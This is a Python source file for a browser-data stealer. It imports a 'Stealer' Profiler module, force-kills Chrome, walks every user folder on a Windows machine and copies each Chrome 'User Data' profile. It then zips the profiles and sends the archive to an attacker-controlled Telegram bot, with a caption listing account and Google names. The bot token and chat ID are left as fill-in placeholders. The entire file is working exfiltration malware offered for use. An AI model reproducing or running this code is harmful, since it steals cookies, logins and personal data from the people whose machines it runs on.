import asyncio
from telegram import Bot
from telegram.constants import ParseMode

import shutil
import tempfile
import os
import uuid
from warnings import warn

from Stealer import Profiler

BOT_TOKEN: str = "<BOT TOKEN>"
USER_ID: int = "<YOUR USER ID (int)>"

async def main():
    print("Loading bot...")
    bot = Bot(token=BOT_TOKEN)
    
    print("Creating temp directory...")
    with tempfile.TemporaryDirectory() as temp_path:
        try:
            os.system("taskkill /f /im chrome.exe")
        except:
            pass
    
        users_path = "C:/Users"

        caption = ""
    
        for user_name in os.listdir(users_path):
            user_path = os.path.join(users_path, user_name)
    
            if (not os.path.isdir(user_path)) or user_name in ("Default", "Default User", "All Users", "Public", ):
                continue
    
            user_data_path = os.path.join(user_path, "AppData", "Local", "Google", "Chrome", "User Data")

            pc_name = f"PC {uuid.getnode()}"
            pc_path = os.path.join(temp_path, pc_name)

            if os.path.exists(user_data_path):
                try:
                    profiler = Profiler(user_data_path)
                    profiler.save_profiles(os.path.join(pc_path, user_name))
                    caption += (f"\n\n<b>{user_name}</b> ({len(profiler.profiles)} profiles):\n" + "\n".join([f"<b>• {profile.name}</b> ({profile.profile_name})\n  {profile.user_name}\n  Name: {profile.gaia_name}\n  Active time: {profile.active_time_timedelta}" for profile in profiler.profiles]))#.replace(".", r"\.")
                except Exception as e:
                    warn(f"Profiler of {user_name} failed:\n{e}")
            else:
                warn(f"User Data path of {user_name} doesn't exist.")
        print("Making archive...")
        zip_path = shutil.make_archive(base_name=pc_path, format='zip', root_dir=temp_path, base_dir=pc_name)
        
        print("Sending archive...")
        with open(zip_path, "rb") as zip:
            await bot.send_document(chat_id=USER_ID, document=zip, caption=caption, parse_mode=ParseMode.HTML)
        
if __name__ == "__main__":
    # Run
    asyncio.run(main())